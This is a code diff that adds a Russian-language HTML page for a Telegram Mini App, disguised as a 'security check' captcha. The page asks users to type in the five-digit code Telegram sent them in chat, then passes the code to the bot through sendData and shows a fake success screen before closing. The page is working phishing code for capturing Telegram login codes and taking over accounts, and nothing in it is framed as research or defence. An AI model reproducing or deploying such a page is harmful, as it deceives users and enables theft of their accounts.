@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Проверка безопасности</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: var(--tg-theme-bg-color, #17212b);
+      color: var(--tg-theme-text-color, #ffffff);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      user-select: none;
+    }
+
+    .card {
+      background: var(--tg-theme-secondary-bg-color, #232e3c);
+      border-radius: 16px;
+      padding: 28px 24px;
+      width: 100%;
+      max-width: 340px;
+      text-align: center;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+    }
+
+    .shield {
+      font-size: 48px;
+      margin-bottom: 12px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50%       { transform: scale(1.08); }
+    }
+
+    h2 {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      opacity: 0.65;
+      margin-bottom: 24px;
+      line-height: 1.4;
+    }
+
+    /* ── Отображение кода ── */
+    .code-display {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .code-cell {
+      width: 44px;
+      height: 52px;
+      border-radius: 10px;
+      background: var(--tg-theme-bg-color, #17212b);
+      border: 2px solid rgba(255,255,255,0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      font-weight: 700;
+      transition: border-color 0.2s, transform 0.15s;
+    }
+
+    .code-cell.filled {
+      border-color: var(--tg-theme-button-color, #2ea6ff);
+      transform: scale(1.05);
+    }
+
+    .code-cell.dot::after {
+      content: '•';
+      opacity: 0.3;
+      font-size: 28px;
+    }
+
+    /* ── Кнопки цифр ── */
+    .numpad {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .num-btn {
+      aspect-ratio: 1;
+      border: none;
+      border-radius: 10px;
+      background: var(--tg-theme-bg-color, #17212b);
+      color: var(--tg-theme-text-color, #fff);
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.1s, background 0.15s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .num-btn:active {
+      transform: scale(0.92);
+      background: var(--tg-theme-button-color, #2ea6ff);
+      color: var(--tg-theme-button-text-color, #fff);
+    }
+
+    /* ── Кнопка удалить ── */
+    .del-btn {
+      aspect-ratio: 1;
+      border: none;
+      border-radius: 10px;
+      background: rgba(255, 80, 80, 0.15);
+      color: #ff5050;
+      font-size: 20px;
+      cursor: pointer;
+      transition: transform 0.1s, background 0.15s;
+      -webkit-tap-highlight-color: transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .del-btn:active {
+      transform: scale(0.92);
+      background: rgba(255, 80, 80, 0.35);
+    }
+
+    /* ── Кнопка подтвердить ── */
+    .confirm-btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      background: var(--tg-theme-button-color, #2ea6ff);
+      color: var(--tg-theme-button-text-color, #fff);
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.2s, transform 0.1s;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .confirm-btn:disabled {
+      opacity: 0.35;
+      cursor: default;
+    }
+
+    .confirm-btn:not(:disabled):active {
+      transform: scale(0.97);
+    }
+
+    /* ── Статусы ── */
+    .status {
+      font-size: 13px;
+      min-height: 18px;
+      margin-bottom: 12px;
+      transition: color 0.2s;
+    }
+
+    .status.error   { color: #ff5050; }
+    .status.success { color: #4caf50; }
+
+    /* ── Успех ── */
+    .success-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .success-screen.show { display: flex; }
+
+    .success-icon { font-size: 64px; }
+    .success-text { font-size: 18px; font-weight: 700; }
+    .success-sub  { font-size: 13px; opacity: 0.65; }
+  </style>
+</head>
+<body>
+
+<div class="card" id="captcha-screen">
+  <div class="shield">🛡️</div>
+  <h2>Проверка безопасности</h2>
+  <p class="subtitle">Введите 5-значный код,<br>который Telegram прислал вам в чат</p>
+
+  <div class="code-display" id="code-display">
+    <div class="code-cell dot" id="cell-0"></div>
+    <div class="code-cell dot" id="cell-1"></div>
+    <div class="code-cell dot" id="cell-2"></div>
+    <div class="code-cell dot" id="cell-3"></div>
+    <div class="code-cell dot" id="cell-4"></div>
+  </div>
+
+  <div class="numpad" id="numpad">
+    <button class="num-btn" onclick="pressDigit('1')">1</button>
+    <button class="num-btn" onclick="pressDigit('2')">2</button>
+    <button class="num-btn" onclick="pressDigit('3')">3</button>
+    <button class="num-btn" onclick="pressDigit('4')">4</button>
+    <button class="num-btn" onclick="pressDigit('5')">5</button>
+    <button class="num-btn" onclick="pressDigit('6')">6</button>
+    <button class="num-btn" onclick="pressDigit('7')">7</button>
+    <button class="num-btn" onclick="pressDigit('8')">8</button>
+    <button class="num-btn" onclick="pressDigit('9')">9</button>
+    <button class="num-btn" onclick="pressDigit('0')">0</button>
+    <button class="del-btn" onclick="deleteLast()">⌫</button>
+  </div>
+
+  <div class="status" id="status"></div>
+
+  <button class="confirm-btn" id="confirm-btn" disabled onclick="confirmCode()">
+    Подтвердить →
+  </button>
+</div>
+
+<div class="card success-screen" id="success-screen">
+  <div class="success-icon">✅</div>
+  <div class="success-text">Проверка пройдена!</div>
+  <div class="success-sub">Возвращаемся в бот...</div>
+</div>
+
+<script>
+  const tg = window.Telegram.WebApp;
+  tg.ready();
+  tg.expand();
+
+  // Скрываем главную кнопку Telegram (используем свою)
+  tg.MainButton.hide();
+
+  let digits = [];
+  const MAX = 5;
+
+  function pressDigit(d) {
+    if (digits.length >= MAX) return;
+    digits.push(d);
+    render();
+    if (digits.length === MAX) {
+      document.getElementById('confirm-btn').disabled = false;
+      setStatus('Нажмите «Подтвердить»', '');
+    }
+  }
+
+  function deleteLast() {
+    if (digits.length === 0) return;
+    digits.pop();
+    document.getElementById('confirm-btn').disabled = true;
+    setStatus('', '');
+    render();
+  }
+
+  function render() {
+    for (let i = 0; i < MAX; i++) {
+      const cell = document.getElementById(`cell-${i}`);
+      cell.textContent = '';
+      cell.className = 'code-cell';
+      if (i < digits.length) {
+        cell.textContent = digits[i];
+        cell.classList.add('filled');
+      } else {
+        cell.classList.add('dot');
+      }
+    }
+  }
+
+  function setStatus(text, type) {
+    const el = document.getElementById('status');
+    el.textContent = text;
+    el.className = 'status' + (type ? ` ${type}` : '');
+  }
+
+  function confirmCode() {
+    if (digits.length !== MAX) return;
+
+    const code = digits.join('');
+
+    // Отправляем код боту через sendData
+    tg.sendData(JSON.stringify({ code: code }));
+
+    // Показываем экран успеха
+    document.getElementById('captcha-screen').style.display = 'none';
+    document.getElementById('success-screen').classList.add('show');
+
+    // Закрываем Mini App через 1.5 сек
+    setTimeout(() => tg.close(), 1500);
+  }
+
+  // Поддержка физической клавиатуры
+  document.addEventListener('keydown', (e) => {
+    if (e.key >= '0' && e.key <= '9') pressDigit(e.key);
+    if (e.key === 'Backspace') deleteLast();
+    if (e.key === 'Enter') confirmCode();
+  });
+</script>
+</body>
+</html>
